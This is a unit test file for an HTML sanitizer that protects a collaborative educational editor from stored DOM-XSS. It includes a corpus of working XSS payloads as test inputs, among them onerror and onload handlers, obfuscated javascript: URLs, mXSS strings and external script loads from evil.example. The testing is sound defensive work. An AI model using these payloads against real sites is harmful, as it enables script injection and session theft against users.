/**
 * sanitizeHtml Tests
 *
 * Unit tests for the collaborative HTML sanitizer used to prevent stored
 * DOM-XSS when rendering iDevice content received from a remote collaborator
 * over Yjs.
 *
 * Run with: make test-frontend
 */

import { JSDOM } from 'jsdom';
import createDOMPurify from '../../libs/dompurify/purify.min.js';
import { COLLABORATIVE_HTML_CONFIG, sanitizeCollaborativeHtml } from './sanitizeHtml.js';

describe('sanitizeHtml', () => {
    describe('with real DOMPurify (primary path)', () => {
        beforeEach(() => {
            // Bind the vendored UMD to a jsdom Window. happy-dom (Vitest's default
            // env) disagrees with DOMPurify 3.4+ on <script>/<p>/<img>, so using
            // the test window would make the primary path look broken even though
            // browsers and jsdom sanitize correctly.
            const { window: purifyWindow } = new JSDOM('<!doctype html><html><body></body></html>');
            const dp = typeof createDOMPurify === 'function' ? createDOMPurify(purifyWindow) : createDOMPurify;
            window.DOMPurify = dp;
        });

        afterEach(() => {
            delete window.DOMPurify;
        });

        it('exposes DOMPurify for the test (sanity check)', () => {
            expect(window.DOMPurify).toBeTruthy();
            expect(typeof window.DOMPurify.sanitize).toBe('function');
        });

        it('neutralizes <img onerror=...> XSS payloads', () => {
            const out = sanitizeCollaborativeHtml('<img src=x onerror="window.__xss=1">');
            expect(out).not.toMatch(/onerror/i);
            expect(out).not.toMatch(/__xss/);
            // The benign <img> element itself is preserved.
            expect(out).toMatch(/<img/i);
        });

        it('turns an executable <script> into inert text', () => {
            const out = sanitizeCollaborativeHtml('<p>hi</p><script>window.__xss=1</script>');
            expect(out).toBe(
                '<p>hi</p><script type="text/plain" data-exe-inert-script="text/javascript">window.__xss=1</script>',
            );
        });

        it('strips javascript: URLs', () => {
            const out = sanitizeCollaborativeHtml('<a href="javascript:window.__xss=1">x</a>');
            expect(out.toLowerCase()).not.toContain('javascript:');
        });

        it('preserves benign structural markup', () => {
            const out = sanitizeCollaborativeHtml('<p><strong>ok</strong></p>');
            expect(out).toBe('<p><strong>ok</strong></p>');
        });

        it('preserves educational iframe embeds and embed attributes', () => {
            const html =
                '<iframe src="https://www.youtube.com/embed/abc" allow="fullscreen" ' +
                'allowfullscreen frameborder="0" referrerpolicy="strict-origin-when-cross-origin"></iframe>';
            const out = sanitizeCollaborativeHtml(html);
            expect(out).toMatch(/<iframe/i);
            expect(out).toMatch(/src="https:\/\/www\.youtube\.com\/embed\/abc"/);
            expect(out).toMatch(/allowfullscreen/);
            expect(out).toMatch(/frameborder="0"/);
            // referrerpolicy must survive — stripping it causes YouTube Error 153.
            expect(out).toMatch(/referrerpolicy="strict-origin-when-cross-origin"/);
        });

        it('returns empty string for null/undefined', () => {
            expect(sanitizeCollaborativeHtml(null)).toBe('');
            expect(sanitizeCollaborativeHtml(undefined)).toBe('');
        });

        it('exports a config that allows iframes and embed attributes', () => {
            expect(COLLABORATIVE_HTML_CONFIG.ADD_TAGS).toContain('iframe');
            expect(COLLABORATIVE_HTML_CONFIG.ADD_ATTR).toEqual(
                expect.arrayContaining([
                    'allow',
                    'allowfullscreen',
                    'frameborder',
                    'scrolling',
                    'target',
                    'referrerpolicy',
                ]),
            );
        });
    });

    describe('fallback path (DOMPurify unavailable)', () => {
        let warnSpy;

        beforeEach(() => {
            delete window.DOMPurify;
            warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
        });

        afterEach(() => {
            warnSpy.mockRestore();
            vi.resetModules();
        });

        it('still neutralizes onerror handlers without DOMPurify', async () => {
            // Fresh module instance so the one-time warning fires.
            const mod = await import('./sanitizeHtml.js?fallback-1');
            const out = mod.sanitizeCollaborativeHtml('<img src=x onerror="window.__xss=1">');
            expect(out).not.toMatch(/onerror/i);
            expect(out).not.toMatch(/__xss/);
            expect(warnSpy).toHaveBeenCalledTimes(1);
        });

        it('turns <script> blocks into inert text in the fallback', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-2');
            const out = mod.sanitizeCollaborativeHtml('<p>hi</p><script>window.__xss=1</script>');
            expect(out).toBe(
                '<p>hi</p><script type="text/plain" data-exe-inert-script="text/javascript">window.__xss=1</script>',
            );
        });

        it('strips javascript: URLs in the fallback', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-3');
            const out = mod.sanitizeCollaborativeHtml('<a href="javascript:alert(1)">x</a>');
            expect(out.toLowerCase()).not.toContain('javascript:');
        });

        it('removes non-allow-listed URL schemes (vbscript:, data:) but keeps safe/relative URLs', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-3b');
            const probe = document.implementation.createHTMLDocument('');

            // Dangerous schemes are dropped (allow-list, so data: incl. svg is covered).
            for (const danger of [
                '<a href="vbscript:msgbox(1)">x</a>',
                '<img src="data:text/html;base64,PHNjcmlwdD4=">',
                '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
            ]) {
                probe.body.innerHTML = mod.sanitizeCollaborativeHtml(danger);
                const el = probe.body.querySelector('a, img');
                expect(el && (el.getAttribute('href') || el.getAttribute('src'))).toBeFalsy();
            }

            // Safe schemes and relative/fragment URLs are preserved.
            const safe = mod.sanitizeCollaborativeHtml(
                '<a href="https://exelearning.net">a</a><a href="/page">b</a><a href="#top">c</a><img src="img.png">',
            );
            expect(safe).toContain('https://exelearning.net');
            expect(safe).toContain('/page');
            expect(safe).toContain('#top');
            expect(safe).toContain('img.png');
        });

        it('does not return the raw dangerous string (fail safe, not open)', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-4');
            const raw = '<img src=x onerror="steal()">';
            const out = mod.sanitizeCollaborativeHtml(raw);
            expect(out).not.toBe(raw);
        });

        it('returns empty string for null/undefined in the fallback', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-5');
            expect(mod.sanitizeCollaborativeHtml(null)).toBe('');
            expect(mod.sanitizeCollaborativeHtml(undefined)).toBe('');
        });

        it('only warns once per module instance', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-6');
            mod.sanitizeCollaborativeHtml('<b>a</b>');
            mod.sanitizeCollaborativeHtml('<b>b</b>');
            expect(warnSpy).toHaveBeenCalledTimes(1);
        });

        it('leaves no executable <script> element for nested/reconstructed markup', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-7');
            // Parser-based sanitization cannot be defeated by the splice trick
            // ("<scr" + "ipt>") that bypasses single-pass regex scrubbers. The
            // sanitized output may still contain the *text* "<script" (a bogus
            // element name), but re-parsing it the way the consumer will (via
            // innerHTML) must yield zero real <script> elements.
            const out = mod.sanitizeCollaborativeHtml('<scr<script>ipt>alert(1)</scr<script>ipt>');
            const probe = document.implementation.createHTMLDocument('');
            probe.body.innerHTML = out;
            expect(probe.body.querySelectorAll('script').length).toBe(0);
        });

        it('removes script blocks whose end tag carries trailing junk', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-8');
            // Browsers close the tag at "</script foo>"; the end-tag regex must
            // too, otherwise the whole block survives (CodeQL js/bad-tag-filter).
            const out = mod.sanitizeCollaborativeHtml('<script>window.__xss=1</script foo><p>after</p>');
            // happy-dom does not end the element at "</script foo>" the way browsers do;
            // either way, whatever script survives must be inert.
            const probe = document.implementation.createHTMLDocument('');
            probe.body.innerHTML = out;
            const scripts = probe.body.querySelectorAll('script');
            expect(scripts.length).toBeGreaterThan(0);
            for (const script of scripts) expect(script.getAttribute('type')).toBe('text/plain');
        });

        it('strips event handlers placed directly after a quoted attribute value', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-9');
            // HTML parsers recover from the missing space and treat `onerror`
            // here as a real attribute, so `<a href="x"onerror=...>` executes.
            // Regex scrubbers that key on a whitespace/"/" separator miss it;
            // the DOM parser normalizes the attribute so it is removed.
            for (const payload of [
                '<a href="x"onerror=alert(1)>link</a>',
                "<img src='x'onerror=alert(1)>",
                '<a title="a"onpointerenter=alert(1)>x</a>',
            ]) {
                const out = mod.sanitizeCollaborativeHtml(payload);
                const probe = document.implementation.createHTMLDocument('');
                probe.body.innerHTML = out;
                for (const el of probe.body.querySelectorAll('*')) {
                    for (const attr of Array.from(el.attributes)) {
                        expect(attr.name.toLowerCase().startsWith('on')).toBe(false);
                    }
                }
            }
        });

        it('strips event handlers separated by "/" (e.g. <svg/onload=...>)', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-10');
            // The handler name is preceded by '/', not whitespace; HTML still
            // parses it as an attribute, so the scrub must match it too.
            for (const payload of [
                '<svg/onload=alert(1)>',
                '<svg/onload="alert(1)">',
                "<body/onload='alert(1)'>",
                '<input/onfocus=alert(1) autofocus>',
            ]) {
                const out = mod.sanitizeCollaborativeHtml(payload);
                expect(out).not.toMatch(/\bon[a-z]+\s*=/i);
            }
        });

        it('strips an unterminated <script tag with no closing ">"', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-11');
            const out = mod.sanitizeCollaborativeHtml('<script src=//evil.example/x');
            expect(out).not.toMatch(/<script/i);
        });

        it('preserves benign words that merely start with "on"', async () => {
            const mod = await import('./sanitizeHtml.js?fallback-12');
            // The handler regex requires "=", so plain prose is not over-stripped.
            const out = mod.sanitizeCollaborativeHtml('<p>onset of the lesson, online</p>');
            expect(out).toContain('onset of the lesson, online');
        });
    });
});

/**
 * Payload corpus shared by both sanitizer paths. Every entry must come out inert:
 * re-parsed the way the editor consumes it (innerHTML), it may not contain a
 * script element, an on* handler, a script-capable URL, srcdoc, or an element
 * that can execute or navigate on its own (object/embed/base/meta refresh).
 */
const XSS_PAYLOADS = [
    ['script tag', '<script>window.__xss=1</script>'],
    ['uppercase external script', '<SCRIPT SRC=//evil.example/x.js></SCRIPT>'],
    ['img onerror', '<img src=x onerror=window.__xss=1>'],
    ['uppercase handler', '<img src="x" ONERROR="window.__xss=1">'],
    ['handler glued to a quoted value', '<a href="x"onclick="window.__xss=1">x</a>'],
    ['slash-separated handler', '<svg/onload=window.__xss=1>'],
    ['autofocus onfocus', '<input autofocus onfocus="window.__xss=1">'],
    ['details ontoggle', '<details open ontoggle="window.__xss=1"><summary>s</summary></details>'],
    ['body onload', '<body onload="window.__xss=1"><p>x</p></body>'],
    ['javascript: href', '<a href="javascript:window.__xss=1">x</a>'],
    ['mixed-case scheme', '<a href="JaVaScRiPt:window.__xss=1">x</a>'],
    ['entity-encoded scheme', '<a href="&#106;&#97;vascript:window.__xss=1">x</a>'],
    ['tab inside scheme', '<a href="java&#x09;script:window.__xss=1">x</a>'],
    ['newline inside scheme', '<a href="java&#10;script:window.__xss=1">x</a>'],
    ['leading control char', '<a href="&#1;javascript:window.__xss=1">x</a>'],
    ['leading spaces', '<a href="   javascript:window.__xss=1">x</a>'],
    ['vbscript:', '<a href="vbscript:msgbox(1)">x</a>'],
    ['data:text/html link', '<a href="data:text/html,<script>window.__xss=1</script>">x</a>'],
    ['javascript: iframe', '<iframe src="javascript:window.__xss=1"></iframe>'],
    ['iframe srcdoc', '<iframe srcdoc="<script>window.__xss=1</script>"></iframe>'],
    ['form action', '<form action="javascript:window.__xss=1"><input type="submit"></form>'],
    ['button formaction', '<form><button formaction="javascript:window.__xss=1">b</button></form>'],
    ['svg onload', '<svg onload="window.__xss=1"></svg>'],
    ['script inside svg', '<svg><script>window.__xss=1</script></svg>'],
    ['svg xlink:href', '<svg><a xlink:href="javascript:window.__xss=1"><text>t</text></a></svg>'],
    ['svg foreignObject', '<svg><foreignObject><img src=x onerror="window.__xss=1"></foreignObject></svg>'],
    ['svg animate href', '<svg><a><animate attributeName="href" values="javascript:window.__xss=1"/><text>t</text></a></svg>'],
    ['math mXSS', '<math><mtext><table><mglyph><style><img src=x onerror="window.__xss=1">'],
    ['noscript mXSS', '<noscript><p title="</noscript><img src=x onerror=window.__xss=1>"></noscript>'],
    ['template content', '<template><img src=x onerror="window.__xss=1"></template>'],
    ['object data', '<object data="javascript:window.__xss=1"></object>'],
    ['embed src', '<embed src="javascript:window.__xss=1">'],
    ['base href', '<base href="javascript:window.__xss=1//">'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=javascript:window.__xss=1">'],
    ['custom element handler', '<model-viewer src="m.glb" onload="window.__xss=1"></model-viewer>'],
    ['unknown custom element handler', '<evil-el onclick="window.__xss=1">e</evil-el>'],
    ['unclosed tag', '<p>text<img src=x onerror="window.__xss=1"'],
    ['nested unclosed', '<div><span><b><img src=x onerror="window.__xss=1"></div>'],
    ['split script splice', '<scr<script>ipt>window.__xss=1</scr<script>ipt>'],
    ['very long input', `${'<b>a</b>'.repeat(5000)}<img src=x onerror="window.__xss=1">`],
    ['unicode around payload', '<p>Ñandú 漢字 🎓</p><img src=x onerror="window.__xss=1">'],
];

const URL_ATTRS = ['href', 'src', 'xlink:href', 'action', 'formaction', 'data', 'poster', 'background', 'values'];
const SCRIPT_SCHEME = /^(?:javascript|vbscript|data:text\/html)/i;

/** Collect every element, including those inside <template> contents. */
function allElements(root) {
    const out = [];
    for (const el of root.querySelectorAll('*')) {
        out.push(el);
        if (el.content && el.content.querySelectorAll) out.push(...allElements(el.content));
    }
    return out;
}

/** Re-parse sanitized output the way the editor does and assert nothing can run. */
const INERT_SCRIPT_TYPES = ['application/json', 'application/ld+json', 'text/tikz', 'text/plain', 'text/template', 'text/x-template'];

function expectInert(html) {
    const probe = document.implementation.createHTMLDocument('');
    probe.body.innerHTML = html;
    for (const script of probe.querySelectorAll('script')) {
        // A script may survive only as a data block no browser executes.
        expect(INERT_SCRIPT_TYPES, `script type="${script.getAttribute('type')}"`).toContain(script.getAttribute('type'));
        expect(script.hasAttribute('src')).toBe(false);
    }
    for (const el of allElements(probe.body)) {
        const tag = el.tagName.toLowerCase();
        expect(['base', 'meta']).not.toContain(tag);
        for (const attr of Array.from(el.attributes)) {
            const name = attr.name.toLowerCase();
            expect(name.startsWith('on'), `${tag}[${name}]`).toBe(false);
            expect(name).not.toBe('srcdoc');
            if (URL_ATTRS.includes(name)) {
                const normalized = attr.value.replace(/[\u0000- ]+/g, '');
                expect(SCRIPT_SCHEME.test(normalized), `${tag}[${name}]=${attr.value}`).toBe(false);
            }
        }
    }
}

describe('sanitizeHtml payload corpus', () => {
    describe('with real DOMPurify', () => {
        beforeEach(() => {
            const { window: purifyWindow } = new JSDOM('<!doctype html><html><body></body></html>');
            window.DOMPurify = createDOMPurify(purifyWindow);
        });

        afterEach(() => {
            delete window.DOMPurify;
        });

        it.each(XSS_PAYLOADS)('neutralizes %s', (_label, payload) => {
            expectInert(sanitizeCollaborativeHtml(payload));
        });

        it('keeps text that surrounds a payload, including unicode', () => {
            const out = sanitizeCollaborativeHtml('<p>Ñandú 漢字 🎓</p><img src=x onerror="window.__xss=1">');
            expect(out).toContain('<p>Ñandú 漢字 🎓</p>');
        });

        it('handles very long input without truncating benign content', () => {
            const out = sanitizeCollaborativeHtml('<b>a</b>'.repeat(5000));
            expect(out.match(/<b>a<\/b>/g)).toHaveLength(5000);
        });

        it.each([
            ['empty string', '', ''],
            ['number', 42, '42'],
            ['plain text', 'just text', 'just text'],
        ])('handles %s input', (_label, input, expected) => {
            expect(sanitizeCollaborativeHtml(input)).toBe(expected);
        });

        it('keeps the app-internal URL schemes legitimate content relies on', () => {
            const html =
                '<img src="asset://uuid/photo.png">' +
                '<a href="exe-node:page-1">page</a>' +
                '<a href="exe-package:elp">package</a>' +
                '<video src="blob:http://localhost/abc"></video>' +
                '<img src="{{context_path}}/a.png">';
            const out = sanitizeCollaborativeHtml(html);
            expect(out).toContain('src="asset://uuid/photo.png"');
            expect(out).toContain('href="exe-node:page-1"');
            expect(out).toContain('href="exe-package:elp"');
            expect(out).toContain('src="blob:http://localhost/abc"');
            expect(out).toContain('src="{{context_path}}/a.png"');
        });

        it('keeps a leading <style> block (iDevice markup often starts with one)', () => {
            const out = sanitizeCollaborativeHtml('<style>.x{color:red}</style><p class="x">t</p>');
            expect(out).toBe('<style>.x{color:red}</style><p class="x">t</p>');
        });

        it('keeps the <model-viewer> element and its attributes for the 3D viewer iDevice', () => {
            const out = sanitizeCollaborativeHtml(
                '<model-viewer src="asset://m.glb" alt="Model" camera-controls auto-rotate></model-viewer>',
            );
            expect(out).toContain('<model-viewer');
            expect(out).toContain('src="asset://m.glb"');
            expect(out).toContain('camera-controls');
            expect(out).toContain('auto-rotate');
        });

        it('keeps media, tables, forms, data/aria attributes and LaTeX text', () => {
            const html =
                '<video controls="" playsinline="" poster="asset://p.png"><source src="asset://v.mp4" type="video/mp4">' +
                '<track kind="subtitles" src="asset://s.vtt" srclang="es"></video>' +
                '<table><tbody><tr><td colspan="2">\\(x^2\\)</td></tr></tbody></table>' +
                '<form><input type="text" name="answer"><select><option value="a">A</option></select></form>' +
                '<div data-idevice-id="abc" aria-label="label" style="color: red;" class="exe-x">ok</div>' +
                '<a href="https://example.org" target="_blank" rel="noopener" download="f.pdf">f</a>';
            expect(sanitizeCollaborativeHtml(html)).toBe(html);
        });

        it('keeps iframe embed attributes, including restrictive sandbox and lazy loading', () => {
            const out = sanitizeCollaborativeHtml(
                '<iframe src="https://www.youtube.com/embed/x" sandbox="allow-scripts" loading="lazy" ' +
                    'allowfullscreen width="560" height="315"></iframe>',
            );
            expect(out).toContain('sandbox="allow-scripts"');
            expect(out).toContain('loading="lazy"');
            expect(out).toContain('width="560"');
        });

        it('keeps data:image sources on images only', () => {
            const out = sanitizeCollaborativeHtml('<img src="data:image/png;base64,AAAA"><a href="data:image/png;base64,AAAA">x</a>');
            expect(out).toContain('<img src="data:image/png;base64,AAAA">');
            expect(out).not.toContain('href="data:');
        });
    });

    describe('fallback (no DOMPurify)', () => {
        let mod;
        let warnSpy;

        beforeEach(async () => {
            delete window.DOMPurify;
            warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
            mod = await import('./sanitizeHtml.js?corpus-fallback');
        });

        afterEach(() => {
            warnSpy.mockRestore();
        });

        it.each(XSS_PAYLOADS)('neutralizes %s', (_label, payload) => {
            expectInert(mod.sanitizeCollaborativeHtml(payload));
        });

        it('keeps the app-internal URL schemes', () => {
            const out = mod.sanitizeCollaborativeHtml(
                '<img src="asset://uuid/photo.png"><a href="exe-node:page-1">p</a><a href="exe-package:elp">e</a>',
            );
            expect(out).toContain('src="asset://uuid/photo.png"');
            expect(out).toContain('href="exe-node:page-1"');
            expect(out).toContain('href="exe-package:elp"');
        });

        it('keeps benign SVG animations that do not target a URL attribute', () => {
            const out = mod.sanitizeCollaborativeHtml(
                '<svg><circle r="5"><animate attributeName="r" values="5;10;5" dur="1s"></animate></circle></svg>',
            );
            expect(out).toMatch(/attributename="r"/i);
        });
    });
});

/**
 * iDevices keep data in <script> blocks the editor reads back. Those must
 * survive with their exact text; nothing a collaborator writes may come out as
 * a script a browser would run.
 */
describe('sanitizeHtml script and embed handling', () => {
    const IV_JSON = '{"slides":[{"type":"text","text":"<p>Hello <b>world</b></p>","startTime":3}]}';

    for (const [label, usePurify] of [
        ['with DOMPurify', true],
        ['with the DOM fallback', false],
    ]) {
        describe(label, () => {
            let sanitize;
            let warnSpy;

            beforeEach(async () => {
                warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
                if (usePurify) {
                    const { window: purifyWindow } = new JSDOM('<!doctype html><html><body></body></html>');
                    window.DOMPurify = createDOMPurify(purifyWindow);
                    sanitize = sanitizeCollaborativeHtml;
                } else {
                    delete window.DOMPurify;
                    sanitize = (await import('./sanitizeHtml.js?scripts-fallback')).sanitizeCollaborativeHtml;
                }
            });

            afterEach(() => {
                delete window.DOMPurify;
                warnSpy.mockRestore();
            });

            const parse = (html) => {
                const probe = document.implementation.createHTMLDocument('');
                probe.body.innerHTML = html;
                return probe.body;
            };

            it('keeps the Interactive Video JSON block byte for byte, HTML inside the JSON included', () => {
                const body = parse(
                    sanitize(
                        `<div class="exe-interactive-video"><script id="exe-interactive-video-contents" type="application/json">${IV_JSON}</script></div>`,
                    ),
                );
                const script = body.querySelector('#exe-interactive-video-contents');
                expect(script.tagName).toBe('SCRIPT');
                expect(script.getAttribute('type')).toBe('application/json');
                expect(script.textContent).toBe(IV_JSON);
                expect(JSON.parse(script.textContent).slides[0].text).toBe('<p>Hello <b>world</b></p>');
            });

            it('keeps a TikZ source block for the circuit renderer', () => {
                const tikz = '\\begin{circuitikz}\\draw (0,0) to[R] (2,0);\\end{circuitikz}';
                const script = parse(sanitize(`<script type="text/tikz">${tikz}</script>`)).querySelector('script');
                expect(script.getAttribute('type')).toBe('text/tikz');
                expect(script.textContent).toBe(tikz);
            });

            it('keeps a legacy executable data script as inert text the reader can still find', () => {
                const legacy = 'var InteractiveVideo = {"slides":[]};';
                const script = parse(sanitize(`<script type="text/javascript">${legacy}</script>`)).querySelector('script');
                expect(script.getAttribute('type')).toBe('text/plain');
                expect(script.getAttribute('data-exe-inert-script')).toBe('text/javascript');
                expect(script.textContent).toBe(legacy);
            });

            it.each([
                ['no type', '<script>window.__xss=1</script>', 'text/javascript'],
                ['module', '<script type="module">window.__xss=1</script>', 'module'],
                ['importmap', '<script type="importmap">{"imports":{}}</script>', 'importmap'],
                ['speculationrules', '<script type="speculationrules">{}</script>', 'speculationrules'],
                ['ecmascript', '<script type="application/ecmascript">window.__xss=1</script>', 'application/ecmascript'],
                ['padded JS type', '<script type="  TEXT/JAVASCRIPT  ">window.__xss=1</script>', 'text/javascript'],
            ])('makes a %s script inert', (_label, html, originalType) => {
                const script = parse(sanitize(html)).querySelector('script');
                expect(script.getAttribute('type')).toBe('text/plain');
                expect(script.getAttribute('data-exe-inert-script')).toBe(originalType);
            });

            it.each([
                ['uppercase data type', '<script type="APPLICATION/JSON">{}</script>', 'application/json'],
                ['data type with parameters', '<script type="text/plain; charset=utf-8">x</script>', 'text/plain'],
            ])('normalizes a %s', (_label, html, expected) => {
                expect(parse(sanitize(html)).querySelector('script').getAttribute('type')).toBe(expected);
            });

            it('drops the src and every other attribute of a kept script', () => {
                const script = parse(
                    sanitize('<script type="application/json" src="//evil.example/x.js" onload="x()" nonce="n" id="d">{}</script>'),
                ).querySelector('script');
                expect(Array.from(script.attributes).map((a) => a.name).sort()).toEqual(['id', 'type']);
            });

            it('drops scripts in SVG or MathML, whose text is parsed differently', () => {
                const body = parse(
                    sanitize(
                        '<svg><script>&lt;/script&gt;&lt;img src=x onerror="window.__xss=1"&gt;</script></svg>' +
                            '<math><script>window.__xss=1</script></math>',
                    ),
                );
                expect(body.querySelectorAll('script')).toHaveLength(0);
                expect(body.querySelector('img')).toBeNull();
            });

            it('never turns a collaborator-written carrier into a script', () => {
                for (const html of [
                    '<textarea data-exe-script-carrier="text/javascript">window.__xss=1</textarea>',
                    '<textarea data-exe-script-carrier="text/javascript">window.__xss=1</textarea><script type="application/json">{}</script>',
                ]) {
                    const body = parse(sanitize(html));
                    for (const script of body.querySelectorAll('script')) {
                        expect(script.textContent).not.toContain('__xss');
                    }
                }
            });

            it('keeps several scripts in order around other content', () => {
                const body = parse(
                    sanitize(
                        '<p>a</p><script type="application/json">{"n":1}</script><p>b</p><script type="text/tikz">t</script>',
                    ),
                );
                expect(Array.from(body.children).map((el) => el.tagName)).toEqual(['P', 'SCRIPT', 'P', 'SCRIPT']);
            });

            it('keeps inline PDF <embed>/<object> and drops script URLs on them', () => {
                const body = parse(
                    sanitize(
                        '<embed src="blob:http://localhost/pdf" type="application/pdf" width="100%">' +
                            '<object data="asset://uuid/doc.pdf" type="application/pdf"></object>' +
                            '<embed src="javascript:window.__xss=1"><object data="javascript:window.__xss=1"></object>',
                    ),
                );
                const [pdfEmbed, badEmbed] = body.querySelectorAll('embed');
                const [pdfObject, badObject] = body.querySelectorAll('object');
                expect(pdfEmbed.getAttribute('src')).toBe('blob:http://localhost/pdf');
                expect(pdfObject.getAttribute('data')).toBe('asset://uuid/doc.pdf');
                expect(badEmbed?.getAttribute('src') ?? null).toBeNull();
                expect(badObject?.getAttribute('data') ?? null).toBeNull();
            });

            it('does not touch a fragment without scripts', () => {
                expect(sanitize('<p>plain <em>text</em></p>')).toBe('<p>plain <em>text</em></p>');
            });
        });
    }
});
